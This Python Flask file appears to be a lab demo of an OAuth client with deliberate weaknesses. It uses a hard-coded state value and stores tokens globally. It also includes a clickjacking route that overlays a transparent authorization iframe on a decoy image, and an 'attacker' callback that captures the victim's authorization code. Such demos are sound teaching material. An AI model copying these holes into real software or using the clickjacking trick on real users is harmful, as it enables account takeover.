from flask import Flask, request, url_for, render_template, redirect, session
import requests
import base64
from authlib.integrations.flask_client import OAuth
import time

app = Flask(__name__)
app.config.from_pyfile('defaultconf.cfg')
def fetch_token(name):
    return tokens[session['user']]
oauth = OAuth(app,fetch_token=fetch_token)
oauth.register(
    name='toyas',
    client_kwargs={
        'scope': 'profile images'
    },
)


tokens = {}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/connect')
def connect():
    test = session.get('user')
    tok = str(tokens)
    redirect_uri = url_for('callback', _external=True)
    return oauth.toyas.authorize_redirect(redirect_uri, state="xyz")

@app.route('/callback')
def callback():

    token = oauth.toyas.authorize_access_token()
    user = oauth.toyas.get('http://toyas:5000/api/profile').json()
    session['user'] = user['id']
    tokens[user['id']] = token
    return redirect(url_for('printer'))


@app.route('/printer', methods=['GET', 'POST'])
def printer():
    if request.method == 'POST':
        time.sleep(5)
        return "Printed"

    images = oauth.toyas.get('http://toyas:5000/api/images').json()
    for image in images:
        image['data'] = oauth.toyas.get('http://toyas:5000/api/images/'+str(image['id'])).text
    
    return render_template('printer.html', images=images)

# This HTML could be served by a any server 
@app.route('/clickjacking')
def iframe():
    url = oauth.toyas.create_authorization_url(url_for('click_callback', _external=True), state="xyz")
    return '<iframe style="position: absolute; top: 0; left: 0;  z-index: 1; opacity: 0.5;"' \
    +'src="'+ url['url']+'''" width="400" height="400">
    </iframe>
    <img style="position: absolute; top: 0; left: 0; z-index: -1;" 
    src=/static/clickjacking.png width="400" height="400">
    '''

# This should be an attacker's client endpoint
@app.route('/click_callback')
def click_callback():
    code = request.args.get('code')
    return "I'm a bad guy and now I have your auth code: "+str(code)

